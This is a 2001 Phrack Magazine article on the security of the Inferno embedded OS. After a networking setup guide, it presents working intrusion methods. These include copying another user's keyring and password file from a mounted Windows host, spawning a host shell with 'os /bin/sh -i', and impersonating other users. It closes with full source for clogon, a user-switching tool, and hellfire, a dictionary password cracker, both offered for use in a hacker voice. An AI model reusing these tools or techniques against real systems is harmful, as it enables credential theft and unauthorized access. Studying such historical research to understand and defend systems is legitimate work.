@@ -1,0 +1,639 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+<head>
+   <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+   <meta http-equiv="content-language" content="en" />
+   <meta name="description" content="Phrack staff website." />
+   <meta name="keywords" content="phrack" />
+   <meta name="robots" content="follow,index,all" />
+
+   <meta name="revisit-after" content="7 days" />
+   
+   <title>.:: Phrack Magazine ::.</title>
+   
+   <link href="../../css/style.css" rel="stylesheet" type="text/css">
+</head>
+<body id="top">
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+
+</div>
+
+<center>
+   <br>
+   <br>
+   <img width="600" src="../../images/phrack-logo.jpg" alt="..[ Phrack Magazine ]..">
+   <br>
+
+   <div class="texto-2">
+   <div class="p-title">.:: The Security of Vita Vuova's Inferno OS ::.</div>
+   <hr width="600" />
+   </div>
+   
+   <div style="padding-top: 4px; padding-bottom: 4px;">
+<div class="around">
+
+<div class="details"><strong>Issues</strong>: 
+[ <a href="../../issues/1/1.html" title="Issue 1">1</a> ] [ <a href="../../issues/2/1.html" title="Issue 2">2</a> ] [ <a href="../../issues/3/1.html" title="Issue 3">3</a> ] [ <a href="../../issues/4/1.html" title="Issue 4">4</a> ] [ <a href="../../issues/5/1.html" title="Issue 5">5</a> ] [ <a href="../../issues/6/1.html" title="Issue 6">6</a> ] [ <a href="../../issues/7/1.html" title="Issue 7">7</a> ] [ <a href="../../issues/8/1.html" title="Issue 8">8</a> ] [ <a href="../../issues/9/1.html" title="Issue 9">9</a> ] [ <a href="../../issues/10/1.html" title="Issue 10">10</a> ] [ <a href="../../issues/11/1.html" title="Issue 11">11</a> ] [ <a href="../../issues/12/1.html" title="Issue 12">12</a> ] [ <a href="../../issues/13/1.html" title="Issue 13">13</a> ] [ <a href="../../issues/14/1.html" title="Issue 14">14</a> ] [ <a href="../../issues/15/1.html" title="Issue 15">15</a> ] [ <a href="../../issues/16/1.html" title="Issue 16">16</a> ] [ <a href="../../issues/17/1.html" title="Issue 17">17</a> ] [ <a href="../../issues/18/1.html" title="Issue 18">18</a> ] [ <a href="../../issues/19/1.html" title="Issue 19">19</a> ] [ <a href="../../issues/20/1.html" title="Issue 20">20</a> ] [ <a href="../../issues/21/1.html" title="Issue 21">21</a> ] [ <a href="../../issues/22/1.html" title="Issue 22">22</a> ] [ <a href="../../issues/23/1.html" title="Issue 23">23</a> ] [ <a href="../../issues/24/1.html" title="Issue 24">24</a> ] [ <a href="../../issues/25/1.html" title="Issue 25">25</a> ] [ <a href="../../issues/26/1.html" title="Issue 26">26</a> ] [ <a href="../../issues/27/1.html" title="Issue 27">27</a> ] [ <a href="../../issues/28/1.html" title="Issue 28">28</a> ] [ <a href="../../issues/29/1.html" title="Issue 29">29</a> ] [ <a href="../../issues/30/1.html" title="Issue 30">30</a> ] [ <a href="../../issues/31/1.html" title="Issue 31">31</a> ] [ <a href="../../issues/32/1.html" title="Issue 32">32</a> ] [ <a href="../../issues/33/1.html" title="Issue 33">33</a> ] [ <a href="../../issues/34/1.html" title="Issue 34">34</a> ] [ <a href="../../issues/35/1.html" title="Issue 35">35</a> ] [ <a href="../../issues/36/1.html" title="Issue 36">36</a> ] [ <a href="../../issues/37/1.html" title="Issue 37">37</a> ] [ <a href="../../issues/38/1.html" title="Issue 38">38</a> ] [ <a href="../../issues/39/1.html" title="Issue 39">39</a> ] [ <a href="../../issues/40/1.html" title="Issue 40">40</a> ] [ <a href="../../issues/41/1.html" title="Issue 41">41</a> ] [ <a href="../../issues/42/1.html" title="Issue 42">42</a> ] [ <a href="../../issues/43/1.html" title="Issue 43">43</a> ] [ <a href="../../issues/44/1.html" title="Issue 44">44</a> ] [ <a href="../../issues/45/1.html" title="Issue 45">45</a> ] [ <a href="../../issues/46/1.html" title="Issue 46">46</a> ] [ <a href="../../issues/47/1.html" title="Issue 47">47</a> ] [ <a href="../../issues/48/1.html" title="Issue 48">48</a> ] [ <a href="../../issues/49/1.html" title="Issue 49">49</a> ] [ <a href="../../issues/50/1.html" title="Issue 50">50</a> ] [ <a href="../../issues/51/1.html" title="Issue 51">51</a> ] [ <a href="../../issues/52/1.html" title="Issue 52">52</a> ] [ <a href="../../issues/53/1.html" title="Issue 53">53</a> ] [ <a href="../../issues/54/1.html" title="Issue 54">54</a> ] [ <a href="../../issues/55/1.html" title="Issue 55">55</a> ] [ <a href="../../issues/56/1.html" title="Issue 56">56</a> ] [ <a href="../../issues/57/1.html" title="Issue 57">57</a> ] [ <a class="current" href="../../issues/58/1.html" title="Issue 58">58</a> ] [ <a href="../../issues/59/1.html" title="Issue 59">59</a> ] [ <a href="../../issues/60/1.html" title="Issue 60">60</a> ] [ <a href="../../issues/61/1.html" title="Issue 61">61</a> ] [ <a href="../../issues/62/1.html" title="Issue 62">62</a> ] [ <a href="../../issues/63/1.html" title="Issue 63">63</a> ] [ <a href="../../issues/64/1.html" title="Issue 64">64</a> ] [ <a href="../../issues/65/1.html" title="Issue 65">65</a> ] [ <a href="../../issues/66/1.html" title="Issue 66">66</a> ] [ <a href="../../issues/67/1.html" title="Issue 67">67</a> ] [ <a href="../../issues/68/1.html" title="Issue 68">68</a> ] [ <a href="../../issues/69/1.html" title="Issue 69">69</a> ] [ <a href="../../issues/70/1.html" title="Issue 70">70</a> ] [ <a href="../../issues/71/1.html" title="Issue 71">71</a> ] 
+</div>
+<div class="opt" align="center"><div class="rt"><a href="../../archives/tgz/phrack58.tar.gz" title="Get current issue tar.gz">Get tar.gz</a></div><strong>Current issue</strong> : #<a href="../../archives/tgz/phrack58.tar.gz" title="Get current issue tar.gz">58</a> | <strong>Release date</strong> : <b>2001-12-28</b> | <strong>Editor</strong> : <b>Phrack Staff</b></div>
+
+<div style="border-top: 1px solid black; border-bottom: 2px solid black">
+<table class="tissue" cellpadding="0" cellspacing="0">
+   <tbody>
+      <tr><td align="left"><a href="../../issues/58/1.html#article">Introduction</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/58/2.html#article">Phrack Loopback</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/58/3.html#article">Phrack Signalnoise</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/58/4.html#article">Advanced return-into-lib(c) exploits (PaX case study)</a></td><td align="right">nergal</td></tr>
+<tr><td align="left"><a href="../../issues/58/5.html#article">Runtime binary encryption</a></td><td align="right">scut &amp; grugq</td></tr>
+<tr><td align="left"><a href="../../issues/58/6.html#article">Advances in kernel hacking</a></td><td align="right">palmers</td></tr>
+<tr><td align="left"><a href="../../issues/58/7.html#article">Linux on-the-fly kernel patching without LKM</a></td><td align="right">devik &amp; sd</td></tr>
+<tr><td align="left"><a href="../../issues/58/8.html#article">Linux x86 kernel function hooking emulation</a></td><td align="right">mayhem</td></tr>
+<tr><td align="left"><a href="../../issues/58/9.html#article">RPC without borders</a></td><td align="right">stealth</td></tr>
+<tr><td align="left"><a href="../../issues/58/10.html#article">Developing StrongARM/Linux shellcode</a></td><td align="right">funkysh</td></tr>
+<tr><td align="left"><a href="../../issues/58/11.html#article">HP-UX (PA-RISC 1.1) Overflows</a></td><td align="right">Zhodiac</td></tr>
+<tr><td align="left"><a href="../../issues/58/12.html#article">The Security of Vita Vuova's Inferno OS</a></td><td align="right">dalai</td></tr>
+<tr><td align="left"><a href="../../issues/58/13.html#article">Phrack World News</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/58/14.html#article">Phrack magazine extraction utility</a></td><td align="right">Phrack Staff</td></tr>
+
+   </tbody>
+</table>
+
+<div class="opt" id="article"><strong>Title</strong> : The Security of Vita Vuova's Inferno OS</div>
+<div class="opt-bottom"> <strong>Author</strong> : dalai</div>
+<pre>                             ==Phrack Inc.==
+
+               Volume 0x0b, Issue 0x3a, Phile #0x0c of 0x0e
+
+|=------------------=[ The Security of Inferno OS ]=---------------------=|
+|=-----------------------------------------------------------------------=|
+|=--------------------=[ dalai &lt;dalai@swbt.net&gt; ]=-----------------------=|
+
+
+  This paper goes over the security semantics of Vita Nuova's Inferno OS,
+and some means by which they may be circumvented. Inferno is a small,
+embedded OS intended to run on devices which may take advantage of its
+distributed aspects. The example Bell Labs likes to use is the T.V.
+set-top box. Anything which relies on remote data to run is an Inferno
+candidate. Other potential uses include networked PDA's, and local
+broadband access hubs (ie for cablemodem, or ION).
+
+  This paper is about security and is not an introduction to Inferno. The
+Inferno Documents and man pages have been made available for public
+consumption and are located at Vita Nuova's website,
+http://www.vitanuova.com. Also, notice the change with my email address.
+Insomnia.org get's DoS'd so they shut out their users. Go figure.
+
+  Lucent has mentioned their intent to utilize Inferno in some of it's up
+and coming products. Firewalls and routers are already being built with
+Inferno, and potential future use includes telecom equipment, and
+dedicated(cheap) Internet terminals. Some outside companies are also taking
+interest in Inferno, but noone can predict how much it will be used in the
+future, or how successful it will be.
+
+  There are many reasons why you'd enjoy playing with Inferno. If it gains
+the market saturation that Vita Nuova hopes for, you will have a vast
+network of devices to play with. The industry hopes to 'e-nable'(tm) nearly
+everything that runs off of power. Vehicles, large household appliances,
+probably even toasters will shortly require some kind of embedded OS to
+drive their superfluous hardware. Inferno is one of the answers, and
+probably the most robust.
+
+
+  90% of anything mentioning Inferno and security in the same context talks
+about the encryption and authentication of network messages. This is all
+fine and dandy, but there's much more to be considered, especially in an
+internetworked OS. And Inferno is about networking. There is little point
+in a stand alone host.
+
+  And thus networking Inferno is fundamental. Here's a little info to get
+your hosts up and talking, preferably to another Inferno-based machine.
+
+  The services to be run by Inferno upon execution of the server binary,
+'lib/srv', are contained in /services/server/config. By default the file
+contains these services:
+
+        styx            6666/tcp                # Main file service
+        mpeg            6667/tcp                # Mpeg stream
+        rstyx           6668/tcp                # Remote invocation
+        infdb           6669/tcp                # Database connection
+        infweb          6670/tcp                # inferno web server
+        infsigner       6671/tcp                # inferno signing services
+        infcsigner      6672/tcp                # inferno signing services
+        inflogin        6673/tcp                # inferno login service
+        virgil          2202/udp        virgild # inferno info
+
+  The file /services/cs/services functions as the Unix /etc/services, and
+can be used to reference the above service names with port numbers.
+'netstat' does for Inferno something similar to what it does for Unix. If
+run under a Unix, copy the contents of /services/cs/services to your
+/etc/services file.
+
+  In order for Inferno to successfully talk to other hosts you must start
+the connection server, 'lib/cs'. This daemon translates network names(in
+the form of protocol!host!port) into a namespace network presence. You can
+specify the services 'lib/srv' is to run by editing the file
+/services/server/config.
+
+
+  You can get two hosts up and talking with these steps, assuming that the
+hosting OS' are connected and can communicate. Hostname translation, IP
+interface selection, and etc. is decided upon by the hosting OS.
+
+
+  1. DNS: 'echo ip.of.dns.server &gt; /services/dns/db', rebuild
+          /services/dns/db. There's an example already in there.
+
+  2. CS: edit /services/cs/db, then 'lib/cs'
+
+  3. SRV: edit /services/server/config, then 'lib/srv' (Run on server)
+
+  4. LOGINS: Run 'changelogin &lt;user&gt;' on the server, this must be done for
+             each user who will be logging in.
+
+  5. KEYS: Run 'getauthinfo default' on the hosts to create the initial
+	   certificates. Do this for both the server and the client. Do
+	   'getauthinfo &lt;server&gt;' on the client. Note that this is for the
+	   default certificate. To get one for use with a particular ip, do
+           'getauthinfo tcp!hostname'.
+
+  6. DONE: You may then use the Inferno network services, for instance you
+           may mount a remote computer under your namespace:
+
+           'mount tcp!host /n/remote'
+		
+           to verify:
+           'lc /n/remote/'
+
+           or:
+           'netstat'
+
+
+  And it's that easy folks. You may want your 'lib/cs', 'lib/srv', and
+mount commands to be done automatically at boot. The 'mount' is just an
+example, there's an infinite number of things you can do with your two
+hosts. You may even opt to mobilize your lego's[1]. Read the man pages.
+
+
+                                   *****
+
+
+  Because of the design of Inferno, and the way it is meant to be applied,
+security can be easily circumvented, yielding unauthorized access on remote
+machines, and access to files on the current machine that you shouldn't be
+able to touch.
+
+  I should say something about hosted Inferno before I forget. Because it
+will rely on the hosting OS' IP mechanism's, the sockets created by Inferno
+will behave under pressure as one created by the host. While a tcp
+connect() scan will dirty up the Inferno console with messages, if the host
+OS is Win32 and someone's invoked 'nmap -sF' against it then Inferno's
+services will be invisible along with Windows'. Likewise, all normal system
+logging still applies to the ports Inferno is using. Understand?
+
+  The OS uses a virtual machine model to run its executables, which are
+typically coded in the Inferno specific language Limbo. The virtual machine
+Dis is secured by the virtue of type checking. Perms under inferno are like
+those in Unix. 'ls -l' will show you what I mean. Unlike Unix, namespace
+resources created by a private application are not by default made
+available to anyone else except the children of that process. Thus we see
+that The Labs have put some effort into securing Inferno.
+
+  Cryptography is integrated into the OS. Messages exchanged between two
+Inferno hosts can be encrypted, or authenticated and plaintext. It's built-
+in cryptographic algorithms are, according to the manual:
+
+
+    - SHA/MD5 hash
+    - Elgamal public key for signature systems
+    - RC4
+    - DES
+    - Diffie-Hellman for key exchange
+
+
+  Authentication relies on the public-key aspects of the above. Isn't that
+super? He who believes cryptography is the end-all of security measures is
+sad indeed. Call me lame or whatever, I'm just not interested in crypto.
+
+  Here I will share with you my techniques for upping your enjoyment of
+Inferno. Check it out, no smoke or mirrors. No strings. If you have console
+access you have the Inferno, so all of my stuff may be done via remote
+login, you can do the Windows thing both locally and remotely in the case
+of 95/98. Test boxes follow the suggested installation perm's.
+
+  1) Windows
+
+  If the Inferno is hosted on Windows 95/98, it won't even try to protect
+key files.  Even if it did, we could just grab what we wanted from Windows,
+with the default path to the Inferno namespace being C:\USERS\INFERNO.
+Observe.
+
+        stacey; cat /dev/user
+        inferno
+        stacey; mount tcp!jessica /n/remote
+        stacey; cd /n/remote/usr/dalai/keyring
+        stacey; lc
+        default
+        stacey; cp default /usr/inferno
+        stacey;
+
+  And then we can login as dalai from a third party box, or log into the
+Window's machine's server. Not as big a deal as it seems, considering how
+Inferno is supposed to be run. We can also use this to get the password
+file, /keydb/password.
+
+
+  2) clogon
+
+  Attached is my command line port of the GUI login utility provided by
+Inferno in the distribution. I call it clogon. Now you can't say I've never
+done anything for you.  This does basically the same thing as wm/logon, but
+is done from the text mode console. Inferno will allow you to switch your
+user name once per session.
+
+        stacey; cat /dev/user
+        inferno
+        stacey; ./clogon -u dalai
+        stacey; cat /dev/user
+        dalai
+        stacey; 
+
+
+  3) hellfire
+
+  Hellfire is my Inferno password cracker. The password file is located
+under /keydb/password, and contains the list of users which will be logging
+in remotely to the machine. The Hellfire source can be found below, or at
+the Trauma Inc. page.
+
+       jessica; hellfire -d dict -u luser
+
+       hellfire, by dalai(dalai@swbt.net)
+       A Traumatized Production.
+       Cracking...
+
+       Password is &quot;victim&quot;
+       Have a nice day.
+       jessica;
+
+
+  You don't need that password for the local machine, however you may use
+it in conjunction with luser's keys to gain his access to a remote machine.
+And it will work the same way with more mundane distributed services. The
+day the utility companies rely on Inferno is the day I hook my computer up
+to the washer and dryer.
+
+
+                                   ******
+
+
+  Inferno may run stand alone, or hosted on another OS(Plan9, Win32,
+several Unix's). When hosted, there are quite often opportunities not only
+to hack Inferno from the host, but also the host from Inferno.
+
+  By default the Inferno emulator(emu) is started with no login prompt.
+This is fine for me, because I use my host OS's login to get into Inferno.
+You can have Inferno run a specified program via the emu command line, and
+thus enable selective login.
+
+  For starters, we can execute a command on the host OS as follows:
+
+        stacey; bind -a '#C' /
+        stacey; os '/bin/sh -i'
+        devcmd: /bin/sh -i pid 12600
+        sh: no job control in this shell
+        sh-2.03$
+
+
+  You have the perm's given to the user and group that Inferno was
+installed under, the suggested is user 'Inferno' and group 'inf'. The
+manual says that if some careless person started Inferno as root, 'os' will
+run as the caller's Inferno username. If that username does not exist on
+the hosting system, then 'cmd' will run as user/nobody.
+
+  Yes, I'm thinking what you're thinking. According to the manual, IF
+Inferno is installed under root, AND you change your Inferno user name to
+that of another user on the host OS, THEN you will become that user on the
+host. But what if that user doesn't have an account on the Inferno? With a
+minor modification clogon will allow you to be whatever user you choose,
+you may use any name at all.
+
+  Note that on Window's systems the 'os' argument must be a binary
+executable in the current path. Things built into the regular Windows
+interpreter(command) won't work. Like Unix, the command is run under the
+same user id that started emu.  Also, you can make a dos/windows/iso9660 fs
+visible under Inferno.
+
+
+                                   ******
+
+
+  After becoming curious with Inferno, I downloaded and played with it for
+awhile.  I became interested enough to write this paper, and i'm overall
+satisfied with the system.  Who knows, I may even use it in some upcoming
+projects. If you like the syntax and feel of Inferno but want a more
+production-type OS, see Plan9.
+
+
+Notes:
+
+[1] - Styx on a Brick: http://www.vitanuova.com/inferno/lego1.html
+
+
+------------------------------ clogon.b ------------------------------------
+
+# clogon
+# port of wm/logon to the command line
+#
+# dalai(dalai@swbt.net)
+# http://www.swbt.net/~dalai
+
+implement clogon;
+
+include &quot;sys.m&quot;;
+	sys: Sys;
+
+include &quot;draw.m&quot;;
+
+include &quot;sh.m&quot;;
+include &quot;newns.m&quot;;
+
+clogon: module
+{
+	init:	fn(nil: ref Draw-&gt;Context, argv: list of string);
+};
+
+init(nil: ref Draw-&gt;Context, argv: list of string)
+{
+	sys = load Sys Sys-&gt;PATH;
+	sys-&gt;print(&quot;clogon, by dalai(dalai@swbt.net)\n&quot;);
+
+	sys-&gt;pctl(sys-&gt;FORKNS|sys-&gt;FORKFD, nil);
+
+	progdir := &quot;#p/&quot; + string sys-&gt;pctl(0, nil);
+	kfd := sys-&gt;open(progdir+&quot;/ctl&quot;, sys-&gt;OWRITE);
+	if(kfd == nil) {
+		sys-&gt;sprint(&quot;cannot open %s:  %r&quot;, progdir+&quot;/ctl&quot;);
+		sys-&gt;raise(&quot;fail:bad prog dir&quot;);
+	}
+
+	usr := &quot;&quot;;
+	if(argv != nil) {
+		argv = tl argv;
+		if(argv != nil &amp;&amp; hd argv == &quot;-u&quot;) {
+			argv = tl argv;
+			if(argv != nil) {
+				usr = hd argv;
+				argv = tl argv;
+			}
+		}
+	}
+
+	if (usr == nil || !logon(usr)) {
+		sys-&gt;print(&quot;usage: clogon -u user\n&quot;);
+	}
+
+	(ok, nil) := sys-&gt;stat(&quot;namespace&quot;);
+
+	if(ok &gt;= 0) {
+		ns := load Newns Newns-&gt;PATH;
+		if(ns == nil)
+			sys-&gt;print(&quot;failed to load namespace builder\n&quot;);
+		else if ((nserr := ns-&gt;newns(nil, nil)) != nil){
+			sys-&gt;print(&quot;error in user namespace file: %s&quot;, nserr);
+			sys-&gt;print(&quot;\n&quot;);
+		}
+	}
+	sys-&gt;fprint(kfd, &quot;killgrp&quot;);
+	errch := chan of string;
+	spawn exec(argv, errch);
+	err := &lt;-errch;
+	if (err != nil) {
+		sys-&gt;fprint(stderr(), &quot;logon: %s\n&quot;, err);
+		sys-&gt;raise(&quot;fail:exec failed&quot;);
+	}
+}
+
+exec(argv: list of string, errch: chan of string)
+{
+	sys-&gt;pctl(sys-&gt;NEWFD, 0 :: 1 :: 2 :: nil);
+	e := ref Sys-&gt;Exception;
+	if (sys-&gt;rescue(&quot;fail:*&quot;, e) == Sys-&gt;EXCEPTION) {
+		sys-&gt;rescued(Sys-&gt;ONCE, nil);
+		exit;
+	}
+
+	argv = &quot;/dis/sh/sh.dis&quot; :: &quot;-i&quot; :: &quot;-n&quot; :: nil;
+	cmd := load Command hd argv;
+	if (cmd == nil) {
+		errch &lt;-= sys-&gt;sprint(&quot;cannot load %s: %r&quot;, hd argv);
+	} else {
+		errch &lt;-= nil;
+		cmd-&gt;init(nil, argv);
+	}
+}
+
+logon(user: string): int
+{
+	userdir := &quot;/usr/&quot;+user;
+	if(sys-&gt;chdir(userdir) &lt; 0) {
+		sys-&gt;print(&quot;There is no home directory for that user mounted on this machine\n&quot;);
+		return 0;
+	}
+
+	#
+	# Set the user id
+	#
+	fd := sys-&gt;open(&quot;/dev/user&quot;, sys-&gt;OWRITE);
+	if(fd == nil) {
+		sys-&gt;print(&quot;failed to open /dev/user: %r\n&quot;);
+		return 0;
+	}
+	b := array of byte user;
+	if(sys-&gt;write(fd, b, len b) &lt; 0) {
+		sys-&gt;print(&quot;failed to write /dev/user with error: %r\n&quot;);
+		return 0;
+	}
+
+	return 1;
+}
+
+stderr(): ref Sys-&gt;FD
+{
+	return sys-&gt;fildes(2);
+}
+
+------------------------------ clogon.b ------------------------------------
+
+
+------------------------------ hellfire.b ----------------------------------
+
+# hellfire.b : /keydb/password decoder
+#
+# by: dalai(dalai@swbt.net)
+# http://www.swbt.net/~dalai
+
+
+implement hellfire;
+
+
+include &quot;sys.m&quot;;
+	sys: Sys;
+include &quot;draw.m&quot;;
+	draw: Draw;
+include &quot;bufio.m&quot;;
+	bufio: Bufio;
+	Iobuf: import bufio;
+include &quot;string.m&quot;;
+	str: String;
+include &quot;arg.m&quot;;
+	arg: Arg;
+include &quot;keyring.m&quot;;
+	keyring: Keyring;
+include &quot;security.m&quot;;
+	pass: Password;
+
+
+hellfire: module
+{
+	init: fn(ctxt: ref Draw-&gt;Context, argv: list of string);
+	usage: fn();
+	finish: fn(temp: array of byte);
+};
+
+init(nil: ref Draw-&gt;Context, argv: list of string)
+{
+	sys = load Sys Sys-&gt;PATH;
+	draw = load Draw Draw-&gt;PATH;
+	bufio = load Bufio Bufio-&gt;PATH;
+	str = load String String-&gt;PATH;
+	arg = load Arg Arg-&gt;PATH;
+	pass = load Password Password-&gt;PATH;
+	keyring = load Keyring Keyring-&gt;PATH;
+
+	sys-&gt;print(&quot;\nhellfire, by dalai(dalai@swbt.net)\n&quot;);
+	sys-&gt;print(&quot;A Traumatized Production.\n&quot;);
+
+	if(argv == nil)
+		usage();
+
+	dfile := pfile := uid := &quot;&quot;;
+	arg-&gt;init(argv);
+
+	while((tmp := arg-&gt;opt()) != 0)
+		case tmp{
+			'd' =&gt; dfile = arg-&gt;arg();
+			'u' =&gt; uid = arg-&gt;arg();
+			* =&gt; usage();
+		}
+
+	if(dfile == nil || uid == nil)
+		usage();
+
+	dfd := bufio-&gt;open(dfile, bufio-&gt;OREAD);
+
+	if(dfd == nil){
+		sys-&gt;print(&quot;Could not open %s.\n&quot;, dfile);
+		exit;
+	}
+
+	pw := pass-&gt;get(uid);
+	if(pw == nil){
+		sys-&gt;print(&quot;Could not get entry for %s.\n&quot;, uid);
+		exit;
+	}
+
+	sys-&gt;print(&quot;Cracking...\n\n&quot;);
+
+	pwbuff2 := array[keyring-&gt;SHAdlen] of byte;
+	pwbuff := array[keyring-&gt;SHAdlen] of byte;
+
+	# try some common passwords
+	for(n := 1; n &lt; 4; n++){
+		if(n == 1)
+			pwbuff = array of byte &quot;password&quot;;
+		if(n == 2)
+			pwbuff = array of byte uid;
+		if(n == 3)
+			pwbuff = array of byte &quot;&quot;;
+
+		keyring-&gt;sha(pwbuff, keyring-&gt;SHAdlen, pwbuff2, nil);
+
+		temp1 := string pwbuff2;
+		temp2 := string pw.pw;
+
+		if(temp2 == temp1){
+			finish(pwbuff);
+		}
+	}
+
+	# if not, try the dictionary
+	for(dentry := &quot;&quot; ; ;){
+		dentry = dfd.gets('\n');
+			if(dentry == nil)
+				break;
+
+		if(dentry[len dentry-1] == '\n'){
+			heh := &quot;&quot;;
+			(heh, nil) = str-&gt;splitl(dentry, &quot;\n&quot;);
+			dentry = heh;
+		}
+
+		pwbuff = array of byte dentry;
+		keyring-&gt;sha(pwbuff, keyring-&gt;SHAdlen, pwbuff2, nil);
+
+		temp1 := string pwbuff2;
+		temp2 := string pw.pw;
+
+		if(temp2 == temp1){
+			finish(pwbuff);
+		}
+	}
+
+	sys-&gt;print(&quot;done.\n&quot;);
+	sys-&gt;print(&quot;Have a nice day.\n&quot;);
+	exit;
+}
+
+finish(pwbuff: array of byte)
+{
+	sys-&gt;print(&quot;Password is \&quot;%s\&quot;\n&quot;, string pwbuff);
+	sys-&gt;print(&quot;Have a nice day.\n&quot;);
+	exit;
+}
+
+usage()
+{
+	sys-&gt;print(&quot;usage: hellfire -d dictionary -u user\n&quot;);
+	exit;
+}
+
+----------------------------- hellfire.b ----------------------------------
+
+|=[ EOF ]=---------------------------------------------------------------=|
+
+</pre>
+
+</div>
+</div>
+
+</center>
+
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+</div>
+
+<div align="right" class="texto-1">© Copyleft 1985-2024, Phrack Magazine.</div>
+</body>
+</html>
